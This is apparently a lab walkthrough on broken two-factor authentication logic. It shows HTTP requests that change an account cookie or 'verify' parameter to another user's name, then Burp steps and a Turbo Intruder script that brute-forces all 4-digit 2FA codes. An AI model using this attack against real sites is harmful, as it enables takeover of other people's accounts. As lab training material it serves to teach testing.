Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.
## Example Logic
A user logs in with their credential in the first step as follows:
```http
POST /login-steps/first HTTP/1.1
Host: target-website.com
...
username=carlos&password=1234
```
They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:
```http
HTTP/1.1 200 OK
Set-Cookie: account=carlos
```
```http
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```
When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:
```http
POST /login-steps/second HTTP/1.1
Host: target-website.com
Cookie: account=carlos
...
verification-code=qwerty
```
In this case, the attacker could login using their own credentials but then change the value of the `account` cookie to any username when submitting the verification code.
```http
POST /login-steps/second HTTP/1.1
Host: target-website.com
Cookie: account=admin
...
verification-code=qwerty
```
This is extremely dangerous if the attacker is then able to brute force the verification code, as it would allow them to login to any user accounts based entirely on their username.
## Exploiting Flawed Logic
1. Notice that in `POST /login2` request, the `verify` parameter is used to determine which user account is being accessed.
2. Send that request to Burp Repeater, and change `POST` to `GET` and `verify` parameter to the target username. This ensures that a temporary 2FA code is generated for the target username.
3. Login with an account you can control. Then submit an invalid 2FA code.
4. Send `POST /login2` to Turbo Intruder (install via bApp).
5. In the pop-up, change the `verify` parameter to target username, then use the following code for the attack:
```python
# https://gist.github.com/bavlayan/aa7470b9692f05f29e6c8ea88e8bde85
def queueRequests(target, wordlists):
    engine = RequestEngine(
	    endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
		engine=Engine.BURP
    )

    for num in range(0, 10000):
        mfa_code = '{0:04}'.format(num)
        engine.queue(target.req, mfa_code.rstrip())


def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```
6. Start the attack. When finished, right click on the request and select **Show response in browser**. Copy the URL and load it in the browser.